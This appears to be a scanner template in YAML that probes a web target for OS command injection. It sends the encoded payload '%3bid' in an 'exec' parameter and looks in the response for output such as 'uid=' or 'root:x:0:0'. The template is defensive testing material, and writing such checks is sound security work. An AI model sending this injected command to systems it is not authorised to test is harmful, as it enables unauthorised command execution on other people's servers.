id: cmdi6-0452
name: 'Shell injection in exec'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via exec'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      exec:
        - '%3bid'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'www-data'
